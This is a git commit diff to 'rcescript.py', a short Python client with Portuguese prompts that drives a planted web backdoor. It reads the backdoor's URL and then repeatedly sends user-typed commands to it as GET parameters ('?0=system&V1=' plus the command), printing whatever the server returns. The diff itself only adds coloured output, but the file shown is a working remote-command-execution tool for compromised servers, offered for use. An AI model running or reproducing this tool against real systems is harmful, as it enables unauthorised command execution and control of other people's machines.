f8cb61aa3c2a53fe6d26cc72d2fa3a7fb6497f94
martin3lli <44301274+martin3lli@users.noreply.github.com>
2020-10-28 11:31:41 -0300

    Update rcescript.py

--- rcescript.py
+++ rcescript.py
@@ -3,16 +3,20 @@
 import os
 import requests
 
+BLUE = '\033[94m'
+ENDC = '\033[0m'
+
+
 print("Script by @wh0001s")
 url = input("URL: ")
 
 if url == "":
     print("Informe a URL com a backdoor.")
 else:
-    print("Informe o cmd para ser executado no backdoor.")
+    print("\nInforme o cmd para ser executado no backdoor.")
     while 1==1:
         cmd = input("cmd: ")
         os.system("cls || clear")
         print("Comando sendo executado: " + cmd) 
         res = requests.get(url + "?0=system&V1=" + cmd)
-        print("\n"+res.text)
+        print("\n"+BLUE+res.text+ENDC)
